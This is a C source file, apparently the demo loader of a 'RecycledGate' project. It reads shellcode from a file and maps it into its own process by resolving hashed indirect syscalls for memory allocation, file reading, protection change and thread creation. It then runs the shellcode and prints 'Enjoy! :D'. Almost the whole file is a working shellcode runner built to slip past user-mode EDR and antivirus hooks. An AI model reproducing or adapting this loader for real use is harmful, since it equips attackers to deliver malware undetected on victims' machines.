#include "windows.h"

#include "Defines.h"
#include "../src/RecycledGate.h"

#include "stdio.h"

extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
extern DoSyscall();

PVOID findNtDll(void);
DWORD getSyscall(DWORD crypted_hash, Syscall* pSyscall);

int main(int argc, char* argv[]) {


	DWORD dwSuccess = FAIL;
	NTSTATUS ntStatus = 0;
	HANDLE hThread = NULL;

	HANDLE hproc = GetCurrentProcess();
	Syscall sysNtAllocateVirtualMemory = { 0x00 }, sysNtCreateThreadEx = { 0x00 }, sysNtProtectVirtualMemory = { 0x00 }, sysNtReadFile = {0x00};

	LPVOID payload = NULL;
	HANDLE hFile = NULL;
	SIZE_T payload_len = 0;



	hFile = CreateFileA(argv[1], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		//printf("[-] Failed to open: %s\n", argv[1]);
		return -1;
	}

	payload_len = GetFileSize(hFile, NULL);
	if (payload_len == 0) {
		//printf("[-] File is empty?\n");
		return -1;
	}


	dwSuccess = getSyscall(0x26d18008, &sysNtAllocateVirtualMemory);
	if (dwSuccess == FAIL) {
		//printf("Failed to get syscall for NtAllocateVirtualMemory");
		return -1;
	}
	PrepareSyscall(sysNtAllocateVirtualMemory.dwSyscallNr, sysNtAllocateVirtualMemory.pRecycledGate);
	ntStatus = DoSyscall(hproc, &payload, 0, (PULONG)&payload_len, MEM_COMMIT |MEM_RESERVE, PAGE_READWRITE);
	//printf("[*] Allocated Virtual Memory\n");

	IO_STATUS_BLOCK ioBlock;


	dwSuccess = getSyscall(0x6fd5d9a7, &sysNtReadFile);
	if (dwSuccess == FAIL) {
		//printf("Failed to get syscall for NtReadFile");
		return -1;
	}
	PrepareSyscall(sysNtReadFile.dwSyscallNr, sysNtReadFile.pRecycledGate);
	ntStatus = DoSyscall(hFile,NULL,NULL,NULL,&ioBlock,payload,(DWORD)payload_len,NULL,NULL);
	//printf("[*] Read shellcode from file to memory\n");
	


	
		

		

	dwSuccess = getSyscall(0x8a4e6274, &sysNtCreateThreadEx);
	if (dwSuccess == FAIL) {
		//printf("Failed to get syscall for NtCreateThreadEx");
		return -1;
	}
		


	dwSuccess = getSyscall(0x496b218c, &sysNtProtectVirtualMemory);
	if (dwSuccess == FAIL) {
		//printf("Failed to get syscall for NtProtectVirtualMemory");
		return -1;
	}
		

	


	DWORD oldAccess = PAGE_READWRITE;
;	PrepareSyscall(sysNtProtectVirtualMemory.dwSyscallNr, sysNtProtectVirtualMemory.pRecycledGate);
	ntStatus = DoSyscall(hproc, (PVOID)&payload, &payload_len, PAGE_EXECUTE_READ, &oldAccess);
	if (!NT_SUCCESS(ntStatus)) {
		//printf("[-] Failed to change memory protection: %x\n", ntStatus);
		return -1;
	}


	PrepareSyscall(sysNtCreateThreadEx.dwSyscallNr, sysNtCreateThreadEx.pRecycledGate);
	ntStatus = DoSyscall(&hThread, GENERIC_ALL, NULL, hproc, (LPTHREAD_START_ROUTINE)payload, NULL, NULL, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(ntStatus)) {
		//printf("[-] Failed to create thread\n");
		return -1;
	}
	printf("Enjoy! :D\n");

	Sleep(50000);


}

